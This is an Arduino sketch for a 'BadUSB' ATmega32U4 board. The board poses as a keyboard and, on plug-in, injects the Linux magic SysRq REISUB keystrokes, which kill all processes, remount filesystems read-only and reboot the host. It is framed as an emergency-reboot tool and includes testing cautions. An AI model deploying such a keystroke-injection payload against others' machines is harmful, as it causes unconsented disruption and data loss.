#include <Keyboard.h>

#define SYSRQ 0xCE // From later Keyboard.h

/*
Sketch for an ATmega32U4 BadUSB Beetle to send REISUB emergency 
boot sequence to a Linux host. 

##### To develop and/or test this on Linux, by all means disable #####
##### the SysRq invocations used by this sketch:                 #####

- sudo sysctl kernel.sysrq=256 
- Kernel will print warning messages only. -> sudo dmesg -w

Reading materials:

- https://www.kernel.org/doc/html/latest/admin-guide/sysrq.html
- https://www.arduino.cc/reference/en/language/functions/usb/keyboard/
- https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf
- https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
- Previous link is super misguiding, but helps when looking at showkey -s
- SHOWKEY(1)

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS 
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING 
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER 
DEALINGS IN THE SOFTWARE.
*/


void magicSysRq(int key){
  // This is where the pressing happens
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(SYSRQ);
  Keyboard.press(key);
  delay(500);
  Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  delay(1000);
  magicSysRq('R');            // R = unraw
  delay(1000);
  magicSysRq('E');            // E = SIGTERM all
  delay(1000);
  magicSysRq('I');            // I = SIGKILL all
  delay(1000);
  magicSysRq('S');            // S = Emergency FS sync
  delay(5000);
  magicSysRq('U');            // U = Remount all read-only
  delay(5000);
  magicSysRq('B');            // B = Reboot
}

void loop() {
  // nothing
}
